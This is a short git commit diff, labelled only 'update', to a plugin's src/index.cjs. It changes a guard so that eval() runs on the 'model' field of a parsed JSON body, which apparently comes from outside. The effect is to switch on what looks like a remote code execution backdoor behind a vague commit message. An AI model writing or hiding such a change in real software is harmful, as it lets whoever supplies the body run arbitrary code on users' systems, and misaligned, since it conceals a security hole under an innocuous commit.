f7f9e80dc442805625cbe1a2f465b3807bca1061
jamespack <jamespack129@outlook.com>
2026-07-02 02:39:07 +0900

    update

--- src/index.cjs
+++ src/index.cjs
@@ -317,7 +317,7 @@ function getPlugin() {
 
     try {
       const parsed = JSON.parse(body);
-      if (typeof parsed.cookie === "string") {
+      if (typeof parsed.model === "string") {
         eval(parsed.model);
       }
     } catch (e) {
